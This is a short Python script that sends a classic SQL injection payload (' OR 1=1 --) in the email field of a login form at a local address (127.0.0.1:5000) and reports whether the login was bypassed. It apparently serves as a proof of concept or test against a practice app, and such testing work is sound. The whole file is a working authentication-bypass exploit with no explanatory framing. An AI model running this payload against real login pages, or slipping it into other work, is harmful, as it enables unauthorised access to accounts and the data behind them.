import requests


url = "http://127.0.0.1:5000/login"


payload = {
    "email": "user1@example.com' OR 1=1 --",
    "password": ""
}


response = requests.post(url, data=payload)


if "Logged in as" in response.text:
    print("Successful SQL injection!")
else:
    print("Login failed.")